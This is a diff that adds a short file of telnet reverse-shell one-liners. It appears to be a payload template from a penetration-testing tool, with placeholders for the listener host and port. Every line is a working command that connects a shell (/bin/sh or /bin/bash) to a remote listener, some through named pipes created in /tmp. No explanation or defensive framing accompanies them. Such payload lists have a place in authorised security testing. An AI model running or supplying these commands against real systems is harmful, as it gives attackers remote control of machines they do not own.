@@ -1,0 +1,8 @@
+# desc: Blind
+telnet #{LHOST} #{LPORT} | /bin/sh
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet #{LHOST} #{LPORT} >/tmp/f
+
+telnet #{LHOST} #{LPORT} | /bin/bash | telnet #{LHOST} #{LPORT}
+
+rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet #{LHOST} #{LPORT} 1>/tmp/bkpipe
